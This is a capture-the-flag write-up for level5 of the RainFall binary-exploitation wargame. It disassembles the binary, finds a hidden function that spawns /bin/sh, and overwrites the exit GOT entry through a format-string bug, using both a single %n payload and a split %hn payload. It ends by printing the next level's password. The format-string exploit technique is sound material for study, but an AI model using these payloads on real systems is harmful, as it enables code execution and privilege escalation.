Same behaviour as the last 2 exercises.
```
0x080484c2 <+0>:	push   %ebp
0x080484c3 <+1>:	mov    %esp,%ebp
0x080484c5 <+3>:	sub    $0x218,%esp 
0x080484cb <+9>:	mov    0x8049848,%eax
0x080484d0 <+14>:	mov    %eax,0x8(%esp)
0x080484d4 <+18>:	movl   $0x200,0x4(%esp) --- load 520 bytes for local variable
0x080484dc <+26>:	lea    -0x208(%ebp),%eax --- 512 bytes allocated for fgets buffer
0x080484e2 <+32>:	mov    %eax,(%esp)
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> --- fgets
0x080484ea <+40>:	lea    -0x208(%ebp),%eax 
0x080484f0 <+46>:	mov    %eax,(%esp)
0x080484f3 <+49>:	call   0x8048380 <printf@plt> --- printf
0x080484f8 <+54>:	movl   $0x1,(%esp) --- move exit code
0x080484ff <+61>:	call   0x80483d0 <exit@plt> -- exit
```
We could do another format string expoit here, but we don't exactly now where. We will check if there are other function 
```
$ objdump -d level5
...
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

(gdb) x/s 0x80485f0
0x80485f0:	 "/bin/sh"
```
Foudn our target, now we have to somehow jump to the address of this function (080484a4 ), so maybe e are able to exit to it by overwriting the GOT(Global Offset Table)
```
(gdb) run < <(python -c "print 'AAAA ' + '%x ' * 20 ")
Starting program: /home/user/level5/level5 < <(python -c "print 'AAAA ' + '%x ' * 20 ")
AAAA 200 b7fd1ac0 b7ff37d0 *41414141* 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a20 
```
First we get our offset wich is the 4th element.
Now we can see that the address called by exit is 0x80483d0. This points to the  Procedure Linkage Table (PLT) entry for exit.
```
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
```
\*0x8049838 it is the literal memory location in the GOT that holds the pointer to exit.
Now all we have to do is to overwrite the data at that memory location with the address of the  O  function.
Now there are 2 aproaches, we could either write the address directly with %n wich is really loud and heavy as we have to convert the address to decimal (134513828)
```
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824c%4\$n" > /tmp/expl
level5@RainFall:~$ cat /tmp/expl - | ./level5 
whoami
level6
```
Or we can use the double write method %hn where we basically devide our address in 2
 \x3a\x98\x04\x08: This is 0x0804983a (The high 2 bytes of the GOT). This is at offset 4.
 \x38\x98\x04\x08: This is 0x08049838 (The low 2 bytes of the GOT). This is at offset 5.
 %2044c%4$hn: Prints 2044 chars (total 2052 - 8 bytes for 2 addrs) and writes 0x0804 to offset 4.   
 %31904c%5$hn: Prints 31904 more chars (total 33956 - 2052 allready writen) and writes 0x84a4 to offset 5.
 ```
 level5@RainFall:~$ python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044c%4$hn" + "%31904c%5$hn"' > /tmp/expl
level5@RainFall:~$ cat /tmp/expl - | ./level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```